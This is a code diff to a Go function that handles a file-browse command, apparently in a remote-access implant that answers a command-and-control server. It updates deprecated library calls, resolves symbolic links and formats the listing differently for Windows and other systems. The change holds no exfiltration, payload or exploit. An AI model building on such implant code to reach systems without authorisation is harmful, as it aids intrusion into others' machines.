@@ -5,12 +5,13 @@ import (
 	"context"
 	"encoding/binary"
 	"io"
-	"io/ioutil"
+	"io/fs"
 	"main/config"
 	"main/packet"
 	"main/util"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 )
 
@@ -82,8 +83,8 @@ func FileBrowse(b []byte) error {
 
 	// list files
 	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
-	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")
-	util.Println(dirPathStr)
+	dirPathStr = strings.TrimSuffix(dirPathStr, "*")
+	dirPathStr = filepath.Clean(dirPathStr)
 	// build string for result
 	/*
 	   /Users/xxxx/Desktop/dev/deacon/*
@@ -101,38 +102,68 @@ func FileBrowse(b []byte) error {
 	   F       272     20/06/2020 08:52:42     deacon.csproj
 	   F       6106    26/07/2020 04:08:54     Program.cs
 	*/
-	fileInfo, err := os.Stat(dirPathStr)
+	dirInfo, err := os.Stat(dirPathStr)
 	if err != nil {
 		return err
 	}
-	modTime := fileInfo.ModTime()
-	currentDir := fileInfo.Name()
+	modTime := dirInfo.ModTime()
 
-	absCurrentDir, err := filepath.Abs(currentDir)
+	absDir, err := filepath.Abs(dirPathStr)
 	if err != nil {
 		return err
 	}
 	modTimeStr := modTime.Format("02/01/2006 15:04:05")
 	resultStr := ""
-	if dirPathStr == "./" {
-		resultStr = util.Sprintf("%s/*", absCurrentDir)
+	// it seems you should always return the same path as given except dir is `.`(current dir)
+	if dirPathStr == "." {
+		if runtime.GOOS != "windows" {
+			// add / as root dir
+			resultStr = util.Sprintf("/%s\\*", strings.ReplaceAll(absDir, "/", "\\"))
+		} else {
+			resultStr = util.Sprintf("%s\\*", absDir)
+		}
 	} else {
 		resultStr = util.Sprintf("%s", string(dirPathBytes))
 	}
-	//resultStr := util.Sprintf("%s/*", absCurrentDir)
 	resultStr += util.Sprintf("\nD\t0\t%s\t.", modTimeStr)
 	resultStr += util.Sprintf("\nD\t0\t%s\t..", modTimeStr)
-	files, err := ioutil.ReadDir(dirPathStr)
+	files, err := os.ReadDir(absDir)
 	if err != nil {
 		return err
 	}
+	// The core of the problem is that the result of os.ReadDir treats all soft links as files,
+	// so I have to use os.Stat to check it again
 	for _, file := range files {
-		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")
-
-		if file.IsDir() {
-			resultStr += util.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
+		var fileInfo os.FileInfo
+		fileInfo, err = file.Info()
+		if err != nil {
+			return err
+		}
+		modTimeStr = fileInfo.ModTime().Format("02/01/2006 15:04:05")
+		// evaluate symlink
+		if fileInfo.Mode()&fs.ModeSymlink == os.ModeSymlink {
+			// use absolute dir
+			linkPath, err := filepath.EvalSymlinks(filepath.Join(absDir, fileInfo.Name()))
+			// unresolved soft link will be treated as normal file
+			if err != nil {
+				util.Printf("unable to resolve symlink: %s\n", err)
+				resultStr += util.Sprintf("\nF\t%d\t%s\t%s", fileInfo.Size(), modTimeStr, file.Name())
+			} else {
+				targetInfo, err := os.Stat(linkPath)
+				// if error occurred, just don't apply new info
+				if err == nil {
+					// be careful that there should use the origin file name
+					if targetInfo.IsDir() {
+						resultStr += util.Sprintf("\nD\t0\t%s\t%s", modTimeStr, fileInfo.Name())
+					} else {
+						resultStr += util.Sprintf("\nF\t%d\t%s\t%s", fileInfo.Size(), modTimeStr, fileInfo.Name())
+					}
+				}
+			}
+		} else if fileInfo.IsDir() {
+			resultStr += util.Sprintf("\nD\t0\t%s\t%s", modTimeStr, fileInfo.Name())
 		} else {
-			resultStr += util.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
+			resultStr += util.Sprintf("\nF\t%d\t%s\t%s", fileInfo.Size(), modTimeStr, fileInfo.Name())
 		}
 	}
 
